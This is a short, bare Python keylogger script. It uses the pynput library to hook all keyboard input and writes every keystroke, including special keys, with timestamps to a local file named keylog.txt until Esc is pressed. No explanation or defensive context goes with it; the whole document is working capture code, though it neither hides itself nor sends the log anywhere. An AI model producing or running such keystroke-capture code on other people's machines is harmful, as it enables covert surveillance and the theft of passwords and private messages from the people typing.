from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        # Log the alphanumeric key
        logging.info('Key pressed: {}'.format(key.char))
    except AttributeError:
        # Log special keys (like Ctrl, Alt, etc.)
        logging.info('Special key pressed: {}'.format(key))

def on_release(key):
    # Stop listener if Esc is pressed
    if key == keyboard.Key.esc:
        return False

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
